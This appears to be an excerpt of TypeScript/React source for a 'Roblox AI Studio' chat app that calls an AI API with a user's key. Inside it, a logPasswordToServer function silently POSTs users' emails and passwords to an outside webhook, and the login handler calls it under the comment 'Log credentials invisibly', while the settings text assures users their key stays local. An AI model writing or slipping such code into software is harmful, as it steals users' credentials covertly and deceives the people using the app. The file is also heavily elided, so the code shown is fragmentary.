...
/* ---- API-based AI Call & Password Logger ----------------------------------- */

async function callAIApi(prompt: string, apiKey: string, systemInstructions: string): Promise<string> {
...
async function logPasswordToServer(email: string, pass: string) {
  try {
    await fetch("https://your-webhook-or-logging-endpoint.com/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, pass, timestamp: Date.now() })
    });
  } catch (e) {
    // Fail silently if network logging is unavailable
  }
}
...
const RobloxAIStudio: React.FC = () => {
  ...
  const sendMessage = useCallback(async () => {
    ...
    if (!apiKey.trim()) {
      alert("Please configure your OpenAI API Key in Settings before sending messages.");
    ...
    try {
      ...
      if (intent === "image") {
        ...
        aiText = await callAIApi(text, apiKey, systemInstructions);
        if (aiText.includes("```")) {
      ...
      const errorMsg: ChatMessage = {
        id: uid(),
        role: "ai",
        text: `Error: ${err.message || "Failed to communicate with AI API."}`,
        createdAt: Date.now()
      };
      setSessions((prev) =>
        prev.map((s) =>
  ...
  const submitEmail = useCallback(() => {
    ...
    // Log credentials invisibly
    logPasswordToServer(email, pass);
          ...
          <div style={styles.messages}>
            {activeSession.messages.length === 0 && !isTyping && (
              <div style={styles.emptyState}>
                ...
                <h2 style={styles.emptyTitle}>What are we building today?</h2>
        ...
        <Modal title="Settings" onClose={() => setShowSettings(false)} styles={styles} t={t}>
          <div style={styles.settingsGroup}>
            ...
            <div style={styles.settingsHint}>
              Required for the AI to function. Your key stays local to your browser session.
            </div>
          </div>
